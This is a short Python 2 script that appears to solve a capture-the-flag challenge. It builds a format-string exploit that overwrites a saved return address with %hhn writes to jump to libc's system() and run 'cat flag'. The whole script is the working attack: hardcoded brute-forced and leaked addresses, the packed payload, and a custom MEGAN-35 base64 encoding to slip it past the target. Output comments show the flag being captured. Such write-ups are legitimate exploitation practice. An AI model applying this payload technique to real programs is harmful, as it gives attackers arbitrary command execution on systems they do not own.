import base64
import sys
import struct

class Megan35:

    def __init__(self):
        megan35 = "3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5"
        b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
        self.srch = dict(zip(b, megan35))
        self.revlsrch = dict(zip(megan35, b))

    def encode(self, pt):
        global srch
        b64 = base64.b64encode(pt)
        r = "".join([self.srch[x] for x in b64])
        return r

    def decode(self, code):
        global revlsrch
        b64 = "".join([self.revlsrch[x] for x in code])
        r = base64.b64decode(b64)
        return r

# Obtenu par bruteforce
SEIP = 0xFFFFdb5c

# Obtenu grace a du LEAK et a la libc fournie
FFLUSH = 0xf7e76330
SYSTEM = 0xf7e53940

payload = struct.pack('<I', SEIP+3)
payload += struct.pack('<I', SEIP+2)
payload += struct.pack('<I', SEIP+1)
payload += struct.pack('<I', SEIP+0)

FMT = "a;cat flag    ;%0{}x%7$hhn%0{}x%8$hhn%0{}x%9$hhn%0{}x%10$hhn\n".format(220,238,84,263)

payload += Megan35().encode(FMT)

print payload

# Decrypt your text with the MEGAN-35 encryption.
# sh: 1: }yuqa: not found
# flag{43eb404b714b8d22e1168775eba1669c}
# sh: 1: %0220x%7%0238x%8%084x%9%0263x%10: not found
